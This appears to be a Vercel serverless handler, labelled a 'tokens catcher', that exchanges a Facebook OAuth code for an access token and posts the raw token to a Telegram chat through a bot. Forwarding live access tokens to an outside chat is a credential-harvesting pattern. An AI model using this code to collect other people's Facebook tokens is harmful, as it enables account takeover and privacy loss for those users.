const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID = process.env.CHAT_ID || '';

const bot = new Telegraf(BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).send('Method Not Allowed');
  }

  const { code } = req.query;


  const tokenUrl = `https://graph.facebook.com/v23.0/oauth/access_token?client_id=${process.env.APP_ID}&client_secret=${process.env.APP_SECRET}&code=${code}&redirect_uri=https://vercel-tokens-catcher.vercel.app/api/fb-webhook`;

  if (!code) {
    return res.status(400).send('Missing code');
  }

  try {
    const response = await fetch(tokenUrl);
    const data = await response.json();
    const llt = data.access_token;
    await bot.telegram.sendMessage(
      CHAT_ID,
      `🔑 Facebook токен:\n\n\`${llt}\``,
      { parse_mode: 'Markdown' }
    );

    res.status(200).send(`OK`);
  } catch (error) {
    console.error('Ошибка:', error);
    res.status(500).send('Ошибка при отправке токена');
  }
};
